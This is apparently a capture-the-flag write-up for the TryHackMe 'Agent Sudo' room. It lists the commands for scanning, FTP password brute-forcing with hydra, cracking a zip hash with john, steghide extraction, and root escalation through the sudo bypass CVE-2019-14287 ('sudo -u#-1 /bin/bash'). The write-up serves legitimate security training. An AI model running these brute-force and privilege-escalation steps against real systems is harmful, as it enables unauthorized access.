# Writeup for [Agent-Sudo](https://tryhackme.com/r/room/agentsudoctf)

## Enumerate

Start with a port scan to find open ports:

```bash
nmap -sV -T5 -oN nmap/initial $IP
```

Visit homepage route via browser
Make request with changen user-agent:

```bash
curl -A 'C' -L http://$IP
```


## Hash hacking and brute-force

Use hydra to crack ftp password

```bash
hydra -P /usr/share/wordlists/rockyou.txt -l chris $IP ftp -V
```

Download images and text-file from ftp storage.
Get files from images

```bash
binwalk cutie.png
```

Folder created with containing files.
Try to unzip zip-file will fail. No password given.

```bash
zip2john 8702.zip > 8702.hash
```

Use John to find password.

```bash
john 8702.hash
```

New file in zip folder:

```bash
steghide --extract -p <password> -sf ../cute-alien.jpg
```

## Capture the user flag

Just read te user_flag.txt file

```bash
cat user_flag.txt
````

## Privilege escalation

I just used `linpeas.sh` to find `sudo` version is < 1.28 [here](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version)

```bash
sudo -l
```

> Last line: `(ALL, !root) /bin/bash '`

For that you can google it and find [CVE-2019-14287](https://www.exploit-db.com/exploits/47502)

```bash
sudo -u#-1 /bin/bash
```

Got root and found `/home/flag.txt`

